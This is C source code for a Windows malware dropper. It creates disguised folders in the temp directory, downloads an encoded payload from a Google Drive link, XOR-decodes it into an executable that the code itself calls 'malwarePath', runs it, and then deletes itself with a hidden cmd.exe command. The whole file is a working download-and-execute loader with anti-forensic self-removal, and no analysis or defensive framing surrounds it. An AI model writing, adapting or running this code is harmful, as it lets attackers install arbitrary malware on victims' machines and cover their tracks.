#include <Windows.h>
#include <stdio.h>
#include <urlmon.h>
#include <tchar.h>
#include <strsafe.h>

#pragma comment(lib, "urlmon.lib")

#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")
//Global variable
static TCHAR desirePath[MAX_PATH];
static TCHAR downloadFolder[MAX_PATH];
static TCHAR tempPath[MAX_PATH];
static TCHAR downloadFile[MAX_PATH];
static TCHAR malwarePath[MAX_PATH];


// Executing Function
void GetDir();
void Downloader();
void Decryptor();
void Laucher();
void SelfDelete();

int main()
{
	GetDir();
	Downloader();
	Decryptor();
	Laucher();
	SelfDelete();
}

void GetDir()
{
	GetTempPath(MAX_PATH, tempPath);
	swprintf_s(desirePath, MAX_PATH, L"%sWndService\\", tempPath);
	swprintf_s(downloadFolder, MAX_PATH, L"%sVSAssistance\\", tempPath);
	CreateDirectory(desirePath, NULL);
	CreateDirectory(downloadFolder, NULL);
}
void Downloader()
{
	TCHAR url[MAX_PATH] = L"https://drive.google.com/uc?export=download&id=1MhN-iz6xaELVU7xiAtKfvD-iCImV8kjW";
	wcscpy(downloadFile, downloadFolder);
	wcscat(downloadFile, L"support.dat");
	URLDownloadToFile(NULL, url, downloadFile, 0, NULL);
}
void Decryptor()
{
	swprintf_s(malwarePath, MAX_PATH, L"%sdump.exe", downloadFolder);
	HANDLE srcHandle = CreateFile(downloadFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_READONLY, NULL);
	HANDLE desHandle = CreateFile(malwarePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (srcHandle == INVALID_HANDLE_VALUE || desHandle == INVALID_HANDLE_VALUE) printf("Ngu vl");
	char buffer[1024];
	DWORD byteRead, byteWrite;
	while (TRUE)
	{
		DWORD bSuccess = ReadFile(srcHandle, buffer, 1024, &byteRead, NULL);
		if (!bSuccess || !byteRead) break;
		for (int i = 0; i < byteRead; ++i)
		{
			buffer[i] = buffer[i] ^ 0x41;
		}
		bSuccess = WriteFile(desHandle, buffer, byteRead, &byteWrite, NULL);
		if (!bSuccess) break;
		
	}
	CloseHandle(srcHandle);
	CloseHandle(desHandle);
}
void Laucher()
{
	SHELLEXECUTEINFO ExecuteInfo;

	memset(&ExecuteInfo, 0, sizeof(ExecuteInfo));

	ExecuteInfo.cbSize = sizeof(ExecuteInfo);
	ExecuteInfo.fMask = 0;
	ExecuteInfo.hwnd = 0;
	ExecuteInfo.lpVerb = L"open";                      // Operation to perform
	ExecuteInfo.lpFile = malwarePath;  // Application name
	ExecuteInfo.lpParameters = NULL;           // Additional parameters
	ExecuteInfo.lpDirectory = 0;                           // Default directory
	ExecuteInfo.nShow = SW_SHOW;
	ExecuteInfo.hInstApp = 0;
	if (ShellExecuteEx(&ExecuteInfo) == FALSE)
		// Could not start application -> call 'GetLastError()'
		return;
}
void SelfDelete() {
	TCHAR szModuleName[MAX_PATH];
	TCHAR szCmd[2 * MAX_PATH];
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	GetModuleFileName(NULL, szModuleName, MAX_PATH);

	StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
}